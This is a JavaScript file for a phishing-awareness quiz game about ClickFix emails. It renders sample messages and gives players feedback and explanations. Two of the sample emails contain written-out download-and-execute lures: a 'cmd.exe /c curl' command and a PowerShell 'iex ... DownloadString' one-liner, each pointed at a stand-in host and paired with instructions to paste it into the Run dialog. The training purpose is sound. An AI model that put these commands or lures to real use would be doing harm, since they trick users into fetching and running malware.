const emailContentDiv = document.getElementById('email-content');

// Explanations for each email
const explanations = [
  "This is a normal internal alert from a known sender. No suspicious links or requests.",
  "This email asks you to run a suspicious command from an unknown sender. Never run commands from emails.",
  "A standard meeting reminder from a known sender. No red flags.",
  "This email asks you to run a PowerShell command from an unknown sender. This is a classic phishing technique.",
  "A friendly email with no suspicious content. Attachments are common, but always verify the sender."
];

function getRandomDate(index) {
  const now = new Date();
  const daysAgo = Math.floor(Math.random() * 5) + index;
  const date = new Date(now.getTime() - daysAgo * 24 * 60 * 60 * 1000);
  const hours = 8 + Math.floor(Math.random() * 9); // 8am-5pm
  const mins = Math.floor(Math.random() * 60);
  date.setHours(hours, mins);
  return date.toLocaleString('en-US', {
    weekday: 'short',
    hour: '2-digit',
    minute: '2-digit',
    hour12: true,
    month: 'short',
    day: 'numeric'
  });
}

let emails = [
  { sender: 'egon@ghostbusters.com', subject: 'Important!', body: 'There are ghosts loose in the building. -the GhostBusters', isClickbait: false, hasAttachment: false, avatar: '' },
  { sender: 'ghosty@clicky.com', subject: 'Paste this and run it', body: 'Use the shortcut keys to windows+r and then paste this command into that window: cmd.exe /c curl http://clicky.com/clicky.exe', isClickbait: true, hasAttachment: true, avatar: '' },
  { sender: 'the_rizzler@rizz.com', subject: 'Meeting Reminder', body: 'Reminder about the meeting tomorrow. - the Rizzler', isClickbait: false, hasAttachment: false, avatar: '' },
  { sender: 'slimer@phantoms.com', subject: 'Run this please', body: 'Hi user, please type Windows+X and then r then paste this command: Powershell.exe iex (New-Object Net.WebClient).DownloadString("http://ghost.com/phantoms.ps1")', isClickbait: true, hasAttachment: false, avatar: '' },
  { sender: 'skibidi@phantom_tax.com', subject: 'Funny Cat Video', body: 'Check out this hilarious cat video. -skibidi', isClickbait: false, hasAttachment: true, avatar: '' }
];

let currentEmail = 0;
let score = 0;
let feedbackMsg = '';
let showExplanation = false;
let answered = false;

// Show improved intro screen on load
function showIntro() {
  emailContentDiv.innerHTML = `
    <div class="email-preview" style="text-align:center;max-width:540px;margin:0 auto;">
      <h2 style="font-size:2em;margin-bottom:0.5em;">Welcome to Find the Clickbait!</h2>
      <div style="font-size:1.15em;line-height:1.7;text-align:left;padding:0 10px;">
        <p style="font-weight:bold;color:#2563eb;font-size:1.1em;">
          Can you spot the phishing emails? Test your skills below!
        </p>
        <div style="margin:1.2em 0;">
          <span style="font-weight:bold;color:#2563eb;">How to Play:</span>
          <ol style="margin:0.7em 0 0.7em 1.5em;padding-left:0.5em;">
            <li>Read each email carefully.</li>
            <li>Choose <b style="color:#2563eb;">ClickFix: Yes</b> if you think it's phishing/clickbait.</li>
            <li>Choose <b style="color:#2563eb;">ClickFix: No</b> if you think it's safe.</li>
            <li>Get instant feedback and an explanation after each answer.</li>
          </ol>
        </div>
        <div style="margin:1.2em 0;">
          <span style="font-weight:bold;color:#2563eb;">What is <span style="color:#b91c1c;">ClickFix</span>?</span>
          <div style="margin-top:0.5em;">
            <span style="color:#b91c1c;font-weight:bold;">ClickFix emails try to trick you</span> into clicking suspicious links, downloading files, or running commands. They are also known as phishing or clickbait emails.
          </div>
        </div>
        <p style="font-weight:bold;color:#2563eb;text-align:center;margin-top:1.5em;">Ready to begin?</p>
      </div>
      <button id="start-btn" class="choice-btn" style="margin-top:24px;font-size:1.15em;padding:16px 36px;">
        Start Game &rarr;
      </button>
    </div>
  `;
  document.getElementById('start-btn').onclick = () => {
    currentEmail = 0;
    score = 0;
    feedbackMsg = '';
    showExplanation = false;
    answered = false;
    showEmail(currentEmail);
  };
}

function highlightRedFlags(emailIdx) {
  let body = emails[emailIdx].body;
  if (emails[emailIdx].isClickbait) {
    body = body.replace(/(cmd\.exe[^\s]*)/gi, '<span class="red-flag">$1</span>');
    body = body.replace(/(Powershell\.exe[^\s]*)/gi, '<span class="red-flag">$1</span>');
    body = body.replace(/(http[s]?:\/\/[^\s"]+)/gi, '<span class="red-flag">$1</span>');
    body = body.replace(/(run it|run this|please type|paste this)/gi, '<span class="red-flag">$1</span>');
  }
  return body;
}

function showEmail(index) {
  const email = emails[index];
  const initials = email.sender.split('@')[0].split(' ').map(w => w[0]).join('').toUpperCase();
  const fakeDate = getRandomDate(index);

  const paperclipIcon = email.hasAttachment
    ? `<svg style="vertical-align:middle;margin-left:8px;" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M21.44 11.05l-9.19 9.19a5 5 0 01-7.07-7.07l9.19-9.19a3 3 0 014.24 4.24l-9.19 9.19a1 1 0 01-1.41-1.41l9.19-9.19"></path></svg>`
    : '';

  const replyIcon = `<svg width="22" height="22" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M10 9V5l-7 7 7 7v-4.1c4.28 0 7.11 1.61 8.94 5.1-.61-5.11-3.44-10-8.94-10z"></path></svg>`;
  const forwardIcon = `<svg width="22" height="22" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M14 9V5l7 7-7 7v-4.1C9.72 14.9 6.89 16.51 5.06 20c.61-5.11 3.44-10 8.94-10z"></path></svg>`;

  const avatarHTML = email.avatar
    ? `<img src="${email.avatar}" class="email-avatar" alt="avatar" />`
    : `<div class="email-avatar">${initials}</div>`;

  let explanationHTML = '';
  if (showExplanation) {
    explanationHTML = `
      <div class="explanation" style="margin:12px 0 0 0; padding:10px 16px; background:#f1f5f9; border-left:4px solid #2563eb; border-radius:6px;">
        <strong>Explanation:</strong> ${explanations[index]}
      </div>
    `;
  }

  let actionButtons = '';
  if (!answered) {
    actionButtons = `
      <button class="choice-btn" id="yes-btn">ClickFix: Yes</button>
      <button class="choice-btn" id="no-btn">ClickFix: No</button>
    `;
  } else {
    actionButtons = `
      <button class="choice-btn" id="next-btn">${currentEmail + 1 === emails.length ? "See Results" : "Next Email"}</button>
    `;
  }

  emailContentDiv.innerHTML = `
    <div class="email-preview">
      <div class="email-header-bar">
        ${avatarHTML}
        <div class="email-header-info" style="flex:1;">
          <div class="subject" style="display:flex;align-items:center;justify-content:space-between;">
            <span>${email.subject}${paperclipIcon}</span>
            <span style="display:flex;gap:10px;margin-left:16px;">
              <span title="Reply" style="cursor:pointer;">${replyIcon}</span>
              <span title="Forward" style="cursor:pointer;">${forwardIcon}</span>
            </span>
          </div>
          <div class="from"><span style="color:#fff;font-weight:500;">${email.sender}</span></div>
          <div class="to" style="color:#e0e7ef;">To: you</div>
          <div class="date">${fakeDate}</div>
        </div>
        <div class="email-status-dot" title="Unread" style="width:12px;height:12px;background:#22d3ee;border-radius:50%;margin-left:12px;"></div>
      </div>
      <div class="email-body-area" style="background: linear-gradient(120deg, #f8fafc 90%, #e0e7ef 100%); position:relative;">
        ${highlightRedFlags(index)}
      </div>
      <div style="min-height:32px;text-align:center;padding:8px 0 0 0;">
        <span id="inline-feedback" style="font-weight:bold;color:#2563eb;">${feedbackMsg}</span>
      </div>
      ${explanationHTML}
      <div class="email-actions-row" style="border-top:1px solid #e0e7ef;">
        ${actionButtons}
      </div>
      <div class="progress-bar" style="margin:18px 0 0 0;">
        <div style="background:#e0e7ef;border-radius:6px;height:10px;width:100%;">
          <div style="background:#2563eb;height:10px;border-radius:6px;width:${((currentEmail+1)/emails.length)*100}%"></div>
        </div>
        <div class="progress-bar-text">
          Email ${currentEmail+1} of ${emails.length}
        </div>
      </div>
    </div>
  `;

  if (!answered) {
    document.getElementById('yes-btn').onclick = () => handleChoice(true);
    document.getElementById('no-btn').onclick = () => handleChoice(false);
  } else {
    document.getElementById('next-btn').onclick = () => {
      feedbackMsg = '';
      showExplanation = false;
      answered = false;
      currentEmail++;
      if (currentEmail < emails.length) {
        showEmail(currentEmail);
      } else {
        showResults();
      }
    };
  }
}

function handleChoice(choice) {
  const correct = emails[currentEmail].isClickbait === choice;
  if (correct) {
    feedbackMsg = "✅ Correct!";
    score++;
  } else {
    feedbackMsg = emails[currentEmail].isClickbait
      ? "❌ Incorrect. This was a ClickFix (phishing/clickbait) email."
      : "❌ Incorrect. This was a safe email.";
  }
  showExplanation = true;
  answered = true;
  showEmail(currentEmail);
}

function showResults() {
  // *** REDIRECTION LOGIC ADDED HERE ***
  // Check if the player achieved a perfect score
  if (score === emails.length) {
    // Redirect to mission-complete.html for a perfect score
    window.location.href = "mission-complete.html";
    return; // Stop the function
  }
  // **********************************

  let reviewHTML = emails.map((email, idx) => {
    const initials = email.sender.split('@')[0].split(' ').map(w => w[0]).join('').toUpperCase();
    const fakeDate = getRandomDate(idx);
    const paperclipIcon = email.hasAttachment
      ? `<svg style="vertical-align:middle;margin-left:8px;" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M21.44 11.05l-9.19 9.19a5 5 0 01-7.07-7.07l9.19-9.19a3 3 0 014.24 4.24l-9.19 9.19a1 1 0 01-1.41-1.41l9.19-9.19"></path></svg>`
      : '';
    const avatarHTML = email.avatar
      ? `<img src="${email.avatar}" class="email-avatar" alt="avatar" />`
      : `<div class="email-avatar">${initials}</div>`;
    return `
      <div class="email-preview" style="margin-bottom:32px;">
        <div class="email-header-bar">
          ${avatarHTML}
          <div class="email-header-info" style="flex:1;">
            <div class="subject" style="display:flex;align-items:center;justify-content:space-between;">
              <span>${email.subject}${paperclipIcon}</span>
            </div>
            <div class="from"><span style="color:#fff;font-weight:500;">${email.sender}</span></div>
            <div class="to" style="color:#e0e7ef;">To: you</div>
            <div class="date">${fakeDate}</div>
          </div>
        </div>
        <div class="email-body-area" style="background: linear-gradient(120deg, #f8fafc 90%, #e0e7ef 100%); position:relative;">
          ${highlightRedFlags(idx)}
        </div>
        <div class="explanation" style="margin:12px 0 0 0; padding:10px 16px; background:#f1f5f9; border-left:4px solid #2563eb; border-radius:6px;">
          <strong>Explanation:</strong> ${explanations[idx]}
        </div>
      </div>
    `;
  }).join('');

  emailContentDiv.innerHTML = `
    <div class="email-preview" style="text-align:center;">
      <h2>Game Over!</h2>
      <p>You correctly identified ${score} out of ${emails.length} emails.</p>
      <button id="restart-btn" class="choice-btn">Play Again</button>
      <h3 style="margin-top:32px;">Review All Emails</h3>
      <div style="max-height:50vh;overflow-y:auto;text-align:left;">${reviewHTML}</div>
    </div>
  `;
  document.getElementById('restart-btn').onclick = () => {
    currentEmail = 0;
    score = 0;
    feedbackMsg = '';
    showExplanation = false;
    answered = false;
    showEmail(currentEmail);
  };
}

// Add red-flag CSS for highlights
const style = document.createElement('style');
style.innerHTML = `
.red-flag {
  background: #fee2e2;
  color: #b91c1c;
  padding: 1px 3px;
  border-radius: 3px;
  font-weight: bold;
}
`;
document.head.appendChild(style);

// Show improved intro on page load
showIntro();
